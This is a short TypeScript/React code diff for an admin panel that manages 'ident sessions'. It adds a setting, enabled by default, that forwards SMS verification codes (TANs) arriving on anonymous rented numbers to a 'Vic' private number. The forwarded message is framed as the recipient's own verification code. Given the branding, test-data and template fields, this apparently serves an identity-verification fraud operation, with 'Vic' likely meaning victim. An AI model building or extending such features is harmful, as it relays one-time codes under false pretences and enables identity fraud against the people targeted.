@@ -38,6 +38,7 @@ interface IdentSession {
   branding_id: string | null;
   email_tan_enabled: boolean;
   email_tans: Array<{ code: string; created_at: string }>;
+  forward_tan_to_vic?: boolean;
 }
 
 interface AnosimSms {
@@ -179,6 +180,7 @@ function IdentDetailContent({
   const [addToBranding, setAddToBranding] = useState(false);
   const [infoNotes, setInfoNotes] = useState((session as any).info_notes ?? "");
   const [templateManagerOpen, setTemplateManagerOpen] = useState(false);
+  const [forwardTanToVic, setForwardTanToVic] = useState(session.forward_tan_to_vic ?? true);
   const { activeBrandingId } = useBrandingFilter();
   const templateBrandingId = session.branding_id ?? activeBrandingId ?? null;
   const { data: infoTemplates } = useIdentInfoTemplates(templateBrandingId);
@@ -292,6 +294,7 @@ function IdentDetailContent({
     setTestData(session.test_data?.length > 0 ? session.test_data : DEFAULT_FIELDS.map(f => ({ label: f, value: "" })));
     setEmailTanEnabled(session.email_tan_enabled ?? false);
     setEmailTans(session.email_tans ?? []);
+    setForwardTanToVic(session.forward_tan_to_vic ?? true);
 
   }, [session.id, session.updated_at]);
 
@@ -445,6 +448,16 @@ function IdentDetailContent({
       .from("ident_sessions" as any)
       .update({ email_tan_enabled: enabled, updated_at: new Date().toISOString() } as any)
       .eq("id", session.id);
+    onUpdate();
+  };
+
+  const handleToggleForwardTan = async (enabled: boolean) => {
+    setForwardTanToVic(enabled);
+    await supabase
+      .from("ident_sessions" as any)
+      .update({ forward_tan_to_vic: enabled, updated_at: new Date().toISOString() } as any)
+      .eq("id", session.id);
+    toast({ title: enabled ? "TAN-Weiterleitung aktiviert" : "TAN-Weiterleitung deaktiviert" });
     onUpdate();
   };
 
@@ -606,6 +619,23 @@ function IdentDetailContent({
                 </div>
               </>
             )}
+            <Separator />
+
+            <div className="flex items-center justify-between rounded-md border border-border p-3">
+              <div className="min-w-0">
+                <p className="text-sm font-medium flex items-center gap-1.5">
+                  <MessageSquare className="h-4 w-4 text-primary" /> TAN an Vic-Nummer weiterleiten
+                </p>
+                <p className="text-xs text-muted-foreground mt-0.5">
+                  Eingehende SMS mit Code werden als „&lt;code&gt; - Ihr Code für die Verifizierung" an die private Nummer weitergesendet.
+                </p>
+              </div>
+              <Switch
+                checked={forwardTanToVic}
+                onCheckedChange={handleToggleForwardTan}
+                className="shrink-0"
+              />
+            </div>
           </CardContent>
         </Card>
 
